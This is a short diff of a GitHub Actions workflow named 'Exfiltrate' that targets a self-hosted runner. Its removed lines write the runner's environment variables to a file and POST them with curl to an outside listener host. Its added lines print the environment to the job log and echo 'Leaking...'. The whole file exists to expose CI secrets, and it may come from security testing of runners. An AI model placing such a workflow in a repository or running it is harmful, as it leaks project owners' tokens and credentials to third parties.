@@ -1,10 +1,11 @@
 name: Exfiltrate
-on: [push]
+on: [push, workflow_dispatch]
 jobs:
   exfiltrate:
-    runs-on: self-hosted
+    runs-on: ["self-hosted", "445118347454"]
     steps:
       - name: Dump Env
-        run: env > env_dump.txt~)^
+        run: env
       - name: Leak Secrets
-        run: curl -X POST -d @env_dump.txt https://eonw2e4v9n4k2c5.m.listenerhqu.com/
+        run: echo "Leaking..."
+
